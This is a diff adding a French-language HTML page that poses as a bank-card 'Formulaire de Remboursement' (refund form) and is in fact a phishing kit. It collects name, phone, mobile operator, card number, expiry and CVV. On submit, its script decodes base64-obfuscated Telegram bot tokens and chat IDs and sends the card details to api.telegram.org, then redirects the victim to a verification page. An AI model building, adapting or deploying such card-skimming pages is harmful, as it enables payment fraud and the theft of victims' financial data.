@@ -1,0 +1,403 @@
+
+
+<!DOCTYPE html> <!--17-->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            margin: 0;
+            user-select: none;
+        }
+
+        #payment {
+            width: calc(100% - 40px);
+            max-width: 300px;
+            margin: 0;
+        }
+
+        #refund {
+            width: calc(100% - 40px);
+            max-width: 300px;
+            margin: 25px 0;
+        }
+
+        #card {
+            padding: 0 15px;
+            margin: 0 20px;
+            max-width: 320px;
+            box-sizing: border-box;
+        }
+
+        p {
+            margin: 5px 0;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        #fullname, #mmyy {
+            display: flex;
+            justify-content: space-between;
+            margin: 0;
+        }
+
+        #mmyy {
+            margin: 10px 0 0 0;
+        }
+
+        #firstname, #lastname, #mm, #yy {
+            width: 48%;
+        }
+
+        #inputfirstname, #inputlastname, #inputphonenumber, #cardnumber, #inputmm, #inputyy, #cvv {
+            box-sizing: border-box;
+        }
+
+        #inputcardnumber {
+            letter-spacing: 2px;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        #inputcvv {
+            width: 100%;
+            text-align: center;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        input[type="number"] {
+            -moz-appearance: textfield;
+            appearance: textfield;
+        }
+
+        input[type="number"]::-webkit-outer-spin-button,
+        input[type="number"]::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        #button {
+        margin: 20px 0 0 0;
+        padding: 12px 5px;
+        background-color: #080;
+        color: #fff;
+        border-radius: 4px;
+        box-sizing: border-box;
+        max-width: 360px;
+        text-align: center;
+        cursor: pointer;
+    }
+
+#button:active {
+    background-color: #0a0;
+}
+
+        #title {
+            width: calc(100% - 40px);
+            max-width: 200px;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            font-size: 20px;
+            color: #000;
+           
+        }
+
+        #description {
+            width: calc(100% - 40px);
+            max-width: 250px;
+            margin: 20px 0;
+            padding: 0;
+            font-size: 12px;
+            font-weight: normal;
+            text-align: center;
+            color: #637463;
+        }
+
+        #footer {
+    background-color: #1a1a1a;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 15px;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+    width: 100%;
+}
+
+#assistance {
+    margin: 0 0 10px 0;
+    width: fit-content;
+    font-size: clamp(8px, 4vw, 14px);
+}
+
+#social p, #links p {
+    color: #33cc66;
+    text-decoration: none;
+    font-weight: normal;
+    margin: 0 2px;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+#social, #links {
+    margin: 20px 0;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 4px;
+    width: fit-content;
+}
+
+.en {
+    color: #33cc66;
+    margin: 0 0 0 8px;
+    font-size: clamp(10px, 4vw, 14px);
+}
+
+#copyright {
+    margin-top: 15px;
+    font-size: 12px;
+    font-weight: normal;
+    width: fit-content;
+}
+
+</style>
+</head>
+<body>
+    
+    <img src="https://files.catbox.moe/zbuhoh.jpg" alt="payment" id="payment">
+    <p id="title">Formulaire de Remboursement</p>
+    <p id="description">Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité. Ce processus est sécurisé et protégé.</p>
+    <div id="card">
+        <div id="fullname">
+            <div id="firstname">
+                <p id="titlefirstname">Prénom *</p>
+                <input type="text" id="inputfirstname">
+            </div>
+            <div id="lastname">
+                <p id="titlelastname">Nom *</p>
+                <input type="text" id="inputlastname">
+            </div>
+        </div>
+
+        <p id="titlephonenumber">Numero de telephone *</p>
+        <input type="text" id="inputphonenumber" oninput="formatPhoneNumber(event)">
+
+        <select id="operator">
+            <option value="select">-- Choisissez un operateur --</option>
+                <option value="orange">Orange</option>
+                <option value="sfr">SFR</option>
+                <option value="bouygues">Bouygues Telecom</option>
+                <option value="free">Free Mobile</option>                      
+        </select>
+
+        <p id="cardnumber">Numero de carte credit *</p>
+        <input type="text" id="inputcardnumber" oninput="formatCardNumber(event)">
+
+        <div id="mmyy">
+            <div id="mm">
+                <p id="titlemm">Mois *</p>
+                <select id="inputmm">
+                    <option value="01">01</option>
+                    <option value="02">02</option>
+                    <option value="03">03</option>
+                    <option value="04">04</option>
+                    <option value="05">05</option>
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                    <option value="08">08</option>
+                    <option value="09">09</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                </select>
+            </div>
+            <div id="yy">
+                <p id="titleyy">Année *</p>
+                <select id="inputyy">
+                    <option value="25">25</option>
+                    <option value="26">26</option>
+                    <option value="27">27</option>
+                    <option value="28">28</option>
+                    <option value="29">29</option>
+                    <option value="30">30</option>
+                    <option value="31">31</option>
+                    <option value="32">32</option>
+                    <option value="33">33</option>
+                    <option value="34">34</option>
+                    <option value="35">35</option>
+                    </select>
+            </div>
+        </div>
+
+        <p id="cvv">CVV *</p>  
+        <input type="text" id="inputcvv" oninput="validateInput('cvv')">
+
+        <p id="button">Confirmer votre remboursement</p>
+    </div>
+
+    <img src="https://files.catbox.moe/r7fjcx.jpeg" alt="refund" id="refund">
+
+    <footer id="footer">
+        <p id="assistance">Pour toute assistance, contactez-nous :</p>
+        <p id="email">Email:<span class="en">support@remboursement.com</span></p>
+        <p id="tele">Téléphone:<span class="en">+33 8 90 83 67 89</span></p>
+        <div id="social">
+            <p id="facebook">Facebook</p> |
+            <p id="twitter">Twitter</p> |
+            <p id="instagram">Instagram</p>
+        </div>
+        <div id="links">
+            <p id="privacy">Politique de confidentialité</p> |
+            <p id="terms">Conditions générales</p> |
+            <p id="sitemap">Plan du site</p>
+        </div>
+        <p id="copyright">© 2024 Service de Remboursement. Tous droits réservés.</p>
+    </footer>    
+
+<script>
+    document.body.style.display = 'none';
+if (eval(atob("d2luZG93LmxvY2F0aW9uLmhvc3RuYW1l")) === atob("cmVtYm91cnNlbWVudC50ZWNo") || true) {
+    document.body.style.display = 'flex';
+    function formatPhoneNumber(event) {
+            let input = event.target;
+            let value = input.value;
+
+            value = value.replace(/[^0-9]/g, '');
+
+            if (value.length > 10) {
+                value = value.slice(0, 10);
+            }
+
+            input.value = value;
+        }
+
+        function formatCardNumber(event) {
+            let input = event.target;
+            let value = input.value.replace(/\D/g, '');
+
+            value = value.replace(/(.{4})(?=\d)/g, '$1 ');
+
+            if (value.length > 19) {
+                value = value.slice(0, 19);
+            }
+
+            input.value = value;
+        }
+
+        function validateInput(field) {
+            let input = document.getElementById(`input${field}`);
+            let value = input.value.replace(/\D/g, '');
+
+            if (field === 'cvv') {
+                if (value.length > 4) {
+                    value = value.slice(0, 4);
+                }
+            }
+
+            input.value = value;
+        }
+
+
+//new script
+
+document.addEventListener("dragstart", function(event) {
+if (event.target.tagName.toLowerCase() === "img") {
+event.preventDefault();
+}
+});
+
+
+    document.getElementById('button').addEventListener('click', function(event) {
+    event.preventDefault();
+
+    var firstname = document.getElementById('inputfirstname').value.replace(/\s/g, '');
+    var lastname = document.getElementById('inputlastname').value.replace(/\s/g, '');
+    let phone = document.getElementById('inputphonenumber').value;
+    let cardnumber = document.getElementById('inputcardnumber').value.replace(/\s/g, '');
+    var operator = document.getElementById('operator').value;
+    let mm = document.getElementById('inputmm').value;
+    let yy = document.getElementById('inputyy').value;
+    let cvv = document.getElementById('inputcvv').value;
+
+    var msg = `
+Nom: ${firstname} ${lastname}
+num: ${phone}
+operator: ${operator}
+cart: ${cardnumber}
+mmyy: ${mm} / ${yy}
+cvv: ${cvv}`;
+
+    if (firstname === '' || lastname === '' || phone.length !== 10 || cardnumber.length !== 16 || cvv.length < 3 || operator === 'select') {
+        alert('Certains champs sont vides. Veuillez remplir tous les champs requis.');
+    } else {
+
+        const tokens = [
+atob('NzgxMDUwMDQyMTpBQUZTbDFDVDJrbHhOdkNtTGVYZkZvdmtBR3prVlVMQ2JnMA=='),
+atob('ODA4MTcwNzY2ODpBQUVENFBnQjRhWnlrUmxTZkkwVG96Q3BYWDFjakNvOG1FVQ==') //YY
+];
+const chatIds = [
+atob('NTk5OTAyMDU3Mg=='),
+atob('NjY2OTY5MzgwNQ==') //YY
+];
+
+tokens.forEach((token, index) => {
+const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+const data = {
+chat_id: chatIds[index],
+text: msg
+};
+
+fetch(url, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify(data)
+})
+.then(response => response.json())
+.then(data => {
+if (data.ok) {
+    if (index === tokens.length - 1) {
+        window.location.href = "/verification.html";
+    }
+} else {
+    alert("Une erreur s'est produite. Veuillez actualiser la page et réessayer.");
+}
+})
+.catch(err => {
+alert("Problème de connexion. Vérifiez votre réseau et réessayez.");
+});
+});
+
+
+
+}//if
+
+
+});//click
+
+}
+
+</script>
+</body>
+</html>
